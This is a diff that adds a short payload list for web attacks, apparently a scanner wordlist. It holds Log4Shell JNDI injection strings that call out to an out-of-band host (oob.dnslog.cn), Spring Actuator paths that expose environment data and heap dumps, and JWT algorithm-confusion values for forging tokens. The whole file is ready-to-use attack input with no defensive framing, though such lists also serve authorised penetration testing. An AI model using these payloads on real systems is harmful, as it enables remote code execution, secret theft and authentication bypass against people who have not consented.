@@ -1,0 +1,12 @@
+# [JNDI-Log4Shell]
+${jndi:ldap://oob.dnslog.cn/a}
+${jndi:rmi://oob.dnslog.cn/a}
+
+# [Spring-Actuator]
+/actuator/env
+/actuator/heapdump
+/actuator/jolokia/list
+
+# [JWT-Alg-Confusion]
+{"alg":"none"}
+{"alg":"HS256"} (with Public-Key-to-HS256 chain)
